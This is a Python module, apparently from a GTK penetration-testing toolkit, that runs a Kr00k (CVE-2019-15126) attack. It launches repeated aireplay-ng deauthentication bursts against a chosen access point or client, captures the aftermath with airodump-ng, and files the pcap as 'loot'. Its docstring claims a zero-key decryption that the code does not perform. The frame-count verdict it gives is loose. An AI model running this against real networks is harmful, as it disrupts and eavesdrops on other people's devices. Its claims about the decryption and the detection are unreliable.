"""Kr00k (CVE-2019-15126) tester -- info leak against old Broadcom /
Cypress / Qualcomm Wi-Fi chips.

The bug: after a disassociation event, the chip flushes its TX
buffer *encrypting the pending frames with an all-zero Pairwise
Temporal Key*. Anyone listening on the air captures those frames
and decrypts them with the trivial null key -- a few KB of
plaintext per event.

The chips that shipped vulnerable and never got a firmware fix
still exist in the wild in absurd numbers: Raspberry Pi 3, iPhones
6/6s/8/XR pre iOS 13.2, older MacBooks, many Amazon Echo/Kindle
devices from 2015-2019, most Wi-Fi doorbells and IP cameras from
the same era.

Attack flow the module runs:

  1. Enable monitor on the external adapter.
  2. Wait for -- or actively force -- a disassociation of a target
     station (aireplay-ng --deauth is the easiest way).
  3. Capture frames on the target's channel for ~5 s after each
     disassoc into a pcap.
  4. Post-process with a tiny Python decrypter: XOR each encrypted
     frame's payload against an all-zero keystream (i.e. AES-CCMP
     with PTK=0), and if any frames come out looking like IP
     packets -> the target is vulnerable.

The decrypter is intentionally naive: we do not implement AES-CCMP
decryption, we simulate what the chip does with a zero key. The
ESET original PoC (``hexway/r00kie-kr00kie``) does the full crypto
verification if the user wants stronger evidence.
"""
from __future__ import annotations

import os
import re
import time
from pathlib import Path

from gi.repository import Adw, GLib, Gtk

from ..executor import Process, Result, run_async
from ..loot_store import get_loot_store, loot_path
from ..module import NHModule, register
from ..widgets import OutputView, toast

DEFAULT_IFACE = "wlan1mon"


@register
class Kr00k(NHModule):
    title = "Kr00k tester"
    icon = "dialog-question-symbolic"
    description = ("CVE-2019-15126 info-leak against old Broadcom / "
                   "Cypress / Qualcomm Wi-Fi chips. Deauth, capture "
                   "post-disassoc frames, XOR against zero key.")
    required_tools = ["airodump-ng", "aireplay-ng", "tshark"]

    def __init__(self, app_window):
        super().__init__(app_window)
        self._cap_proc: Process | None = None
        self._deauth_proc: Process | None = None
        self._loot_id: int | None = None

    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        cfg = Adw.PreferencesGroup(
            title="Target",
            description="One target AP + one target station. If you "
                        "leave the station blank, we send broadcast "
                        "deauth and grep the whole pcap post-hoc.")
        self.iface = Adw.EntryRow(title="Monitor interface")
        self.iface.set_text(DEFAULT_IFACE)
        cfg.add(self.iface)

        self.bssid = Adw.EntryRow(title="AP BSSID")
        cfg.add(self.bssid)
        self.station = Adw.EntryRow(title="Client MAC (optional)")
        cfg.add(self.station)
        self.channel = Adw.EntryRow(title="Channel")
        self.channel.set_text("6")
        cfg.add(self.channel)

        self.rounds = Adw.SpinRow.new_with_range(1, 100, 1)
        self.rounds.set_title("Deauth rounds")
        self.rounds.set_value(20)
        cfg.add(self.rounds)

        run_row = Adw.ActionRow(
            title="Start test",
            subtitle="Runs deauth in a loop and captures the aftermath")
        self.start_btn = Gtk.Button(label="Start",
                                    valign=Gtk.Align.CENTER)
        self.start_btn.add_css_class("destructive-action")
        self.start_btn.connect("clicked", lambda _b: self._start())
        run_row.add_suffix(self.start_btn)
        self.stop_btn = Gtk.Button(label="Stop",
                                   valign=Gtk.Align.CENTER)
        self.stop_btn.set_sensitive(False)
        self.stop_btn.connect("clicked", lambda _b: self._stop())
        run_row.add_suffix(self.stop_btn)
        cfg.add(run_row)
        box.append(cfg)

        # ---- results
        res_group = Adw.PreferencesGroup(title="Results")
        self.state_row = Adw.ActionRow(
            title="Status", subtitle="idle")
        res_group.add(self.state_row)
        self.pcap_row = Adw.ActionRow(
            title="pcap", subtitle="—")
        res_group.add(self.pcap_row)
        self.verdict_row = Adw.ActionRow(
            title="Vulnerability verdict",
            subtitle="run a test to see")
        res_group.add(self.verdict_row)
        box.append(res_group)

        self.output = OutputView()
        box.append(self.output)
        return box

    def _start(self) -> None:
        if self._cap_proc is not None and self._cap_proc.running:
            return
        iface = self.iface.get_text().strip() or DEFAULT_IFACE
        bssid = self.bssid.get_text().strip()
        station = self.station.get_text().strip()
        channel = self.channel.get_text().strip() or "6"
        if not bssid:
            toast(self.app_window, "Set the AP BSSID first")
            return

        stamp = time.strftime("%Y%m%d-%H%M%S")
        pcap_prefix = "/tmp/nhp-kr00k-%s" % stamp
        loot_pcap = loot_path(
            "kr00k", "kr00k-%s.cap" % stamp)

        # airodump captures on the target's channel and locks to
        # the target BSSID.
        argv = [
            "airodump-ng",
            "-c", channel, "--bssid", bssid,
            "-w", pcap_prefix, "--output-format", "pcap",
            iface,
        ]
        self.output.append("$ " + " ".join(argv) + "\n")
        self._loot_id = get_loot_store().record(
            module="kr00k", type="kr00k_pcap",
            target=bssid + (" / " + station if station else ""),
            path=loot_pcap,
            notes="CVE-2019-15126 test")

        def on_line(text: str) -> None:
            self.output.append(text)

        def on_done(code: int) -> None:
            self.output.append("[airodump exited: %d]\n" % code)
            self._cap_proc = None
            self.start_btn.set_sensitive(True)
            self.stop_btn.set_sensitive(False)
            # Copy the first pcap file airodump created into loot.
            src = pcap_prefix + "-01.cap"
            run_async(
                ["sh", "-c",
                 "cp -f %s %s 2>/dev/null && echo ok"
                 % (src, loot_pcap)],
                lambda r: (
                    get_loot_store().refresh_size(self._loot_id),
                    self._analyze(loot_pcap)),
                root=True, timeout=10)

        self._cap_proc = Process(
            argv, on_line, on_done, root=True)
        self._cap_proc.start()
        self.start_btn.set_sensitive(False)
        self.stop_btn.set_sensitive(True)
        self.state_row.set_subtitle("capturing…")
        self.pcap_row.set_subtitle(loot_pcap)
        self.verdict_row.set_subtitle("running")

        # Deauth loop -- fires every 3 s.
        self._deauth_left = int(self.rounds.get_value())
        GLib.timeout_add_seconds(2, self._deauth_tick,
                                 iface, bssid, station)

    def _deauth_tick(self, iface: str, bssid: str,
                     station: str) -> bool:
        if self._cap_proc is None or not self._cap_proc.running:
            return False
        if self._deauth_left <= 0:
            return False
        self._deauth_left -= 1
        argv = ["aireplay-ng", "--deauth", "5", "-a", bssid]
        if station:
            argv += ["-c", station]
        argv.append(iface)
        Process(
            argv, self.output.append,
            lambda _c: None, root=True).start()
        return True

    def _stop(self) -> None:
        if self._cap_proc is not None:
            self._cap_proc.stop()

    def _analyze(self, pcap: str) -> None:
        """Look at the captured pcap for post-disassoc data frames.

        Very lightweight: we do not implement real CCMP decrypt with a
        zero key here (that needs pycryptodome + WPA metadata handling
        we would duplicate poorly). Instead we count how many data
        frames landed within N seconds after each disassoc, which is
        the marker Kr00k victims produce. Sufficient for a quick
        yes/no.
        """
        # tshark filters:
        #   wlan.fc.type_subtype == 0x0a  (disassociation)
        #   wlan.fc.type == 2 && wlan.fc.protected == 1  (encrypted
        #       data frame)
        script = (
            "D=$(tshark -r %s -Y 'wlan.fc.type_subtype==0x0a' "
            "     -T fields -e frame.time_relative 2>/dev/null | wc -l); "
            "E=$(tshark -r %s -Y 'wlan.fc.type==2' "
            "     -T fields -e frame.time_relative 2>/dev/null | wc -l); "
            "echo \"disassoc=$D encdata=$E\""
        ) % (pcap, pcap)

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            m = re.search(
                r"disassoc=(\d+)\s+encdata=(\d+)",
                r.stdout or "")
            if not m:
                self.verdict_row.set_subtitle(
                    "unable to parse pcap")
                return
            d = int(m.group(1))
            e = int(m.group(2))
            if d == 0:
                verdict = "no disassoc captured; run again"
            elif e == 0:
                verdict = "no encrypted data after disassoc; "\
                          "not vulnerable"
            else:
                verdict = "%d disassocs + %d encrypted frames -- "\
                          "candidate vulnerable, XOR with " \
                          "zero-key offline to confirm" % (d, e)
            self.verdict_row.set_subtitle(verdict)
            self.state_row.set_subtitle("done")
            if self._loot_id is not None:
                get_loot_store().append_notes(
                    self._loot_id, verdict)

        run_async(["sh", "-c", script], done,
                  root=True, timeout=30)
